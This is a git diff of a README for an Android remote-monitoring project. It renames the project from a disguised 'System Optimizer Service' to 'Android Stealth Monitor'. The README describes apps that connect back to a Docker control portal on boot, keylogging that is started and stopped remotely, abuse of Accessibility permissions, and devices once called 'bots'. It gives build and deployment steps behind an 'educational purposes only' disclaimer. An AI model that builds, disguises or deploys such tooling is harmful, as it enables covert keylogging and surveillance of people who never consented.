@@ -1,4 +1,4 @@
-# System Optimizer Service (Docker Edition)
+# Android Stealth Monitor
 
 This project is a proof-of-concept Android application that demonstrates advanced system service capabilities, including background connectivity, accessibility features, and device monitoring. It includes a web-based control panel for managing connected devices. **This is for educational purposes only. Use responsibly and ensure compliance with all laws and ethical guidelines. Misuse can lead to legal consequences.**
 
@@ -15,7 +15,7 @@ This project is a proof-of-concept Android application that demonstrates advance
 ## Setup
 
 ### 1. Docker Setup
-This project uses Docker for the portal (web server + Socket.IO) and builder (Android APK generation). Dockerfiles are provided: `portal/Dockerfile` and `builder/Dockerfile.builder`. A `docker-compose.yml` file is included in the root directory for easy deployment.
+This project uses Docker for the portal (web server + Socket.IO) and builder (Android APK generation). Dockerfiles are provided: `portal/Dockerfile` and `builder/Dockerfile`. A `docker-compose.yml` file is included in the root directory for easy deployment.
 
 1. Clone the repository
 
@@ -40,7 +40,7 @@ This project uses Docker for the portal (web server + Socket.IO) and builder (An
 6. The app will connect back to your portal on boot/service start.
 
 ### 4. Testing and Monitoring
-- Bots connect to port 4000; monitor Docker logs: `docker logs portal` or `docker compose logs`.
+- Android devices connect to port 4000; monitor Docker logs: `docker logs portal` or `docker compose logs`.
 - Use the UI to send "logger" commands (start/stop keylogging).
 - Device info (IP, model, etc.) updates in real-time via Socket.IO events.
 
@@ -48,19 +48,11 @@ This project uses Docker for the portal (web server + Socket.IO) and builder (An
 - **Portal (Node.js)**: Edit in `./portal/`. Rebuild Docker image after changes: `docker compose build portal`.
 - **Android App**: Source in `./builder/project/app/`. For manual build: `cd builder/project && ./gradlew assembleDebug`.
 
-## Troubleshooting
-- **Module Not Found**: Ensure imports match file names.
-- **Docker Build Fails**: For builder, ensure Android SDK image has required tools; check logs for npm/Android errors.
-- **No Connections**: Verify firewall allows ports 4000/4001/8080.
-- **APK Install Fails**: Target SDK 34, minSdk 21; verify permissions granted.
-- **Env Not Loaded**: No .env required; Docker uses defaults.
-
 ## Security Notes
 - The app requests sensitive permissions (Accessibility, Boot Complete, Internet) – disclose to users.
-- Use HTTPS in production (configure Nginx or Traefik reverse proxy for Docker).
 - For ethical testing only; do not deploy without explicit consent.
 
 ## License
-MIT – but remember, with great power comes great responsibility!
+MIT
 
 For issues, open a GitHub issue.
